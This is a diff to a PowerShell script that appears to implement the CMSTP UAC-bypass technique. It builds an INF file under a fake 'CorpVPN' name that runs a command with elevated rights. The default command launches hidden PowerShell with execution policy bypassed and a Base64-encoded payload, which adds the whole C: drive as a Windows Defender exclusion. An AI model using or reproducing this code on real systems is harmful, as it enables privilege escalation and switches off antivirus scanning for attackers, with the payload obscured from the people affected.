@@ -1,12 +1,11 @@
-Function script:Set-INFFile {
+Function Set-INFFile {
     [CmdletBinding()]
     Param (
         [Parameter(HelpMessage="Specify the INF file location")]
         $InfFileLocation = "$env:temp\CMSTP.inf",
     
         [Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-        [String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA== >> %temp%\exclusion.bat'
-
+        [String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=='
     )
 
     $InfContent = @"
@@ -19,7 +18,6 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-; Commands Here will be run Before Setup Begins to install
 $CommandToExecute
 taskkill /IM cmstp.exe /F
 
@@ -36,7 +34,6 @@ ShortSvcName="CorpVPN"
 
     $InfContent | Out-File $InfFileLocation -Encoding ASCII
 }
-
 
 Function Get-Hwnd {
     [CmdletBinding()]
